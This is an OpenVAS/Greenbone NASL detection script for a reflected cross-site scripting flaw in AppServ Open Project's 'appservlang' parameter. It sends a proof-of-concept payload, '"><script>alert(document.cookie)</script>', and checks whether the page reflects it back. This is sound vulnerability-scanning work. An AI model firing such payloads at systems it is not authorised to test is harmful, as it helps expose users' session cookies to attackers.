# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:appserv_open_project:appserv";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802429");
  script_version("2024-06-27T05:05:29+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-04-16 13:48:58 +0530 (Mon, 16 Apr 2012)");
  script_name("AppServ Open Project 'appservlang' XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_appserv_open_project_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("AppServ/installed");

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/18036");
  script_xref(name:"URL", value:"http://www.allinfosec.com/2012/04/15/webapps-0day-apache-2-5-92-5-10win-xss-vulnerability-6/");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'appservlang'
  parameter in 'index.php' is not properly sanitised before being returned to
  the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"AppServ Open Project is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of
  an affected application.");
  script_tag(name:"affected", value:"AppServ Open Project Version 2.5.10 and prior");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + '/index.php?appservlang="><script>alert(document.cookie)</script>';

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"><script>alert\(document.cookie\)</script>",
    extra_check:"AppServ Open Project" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
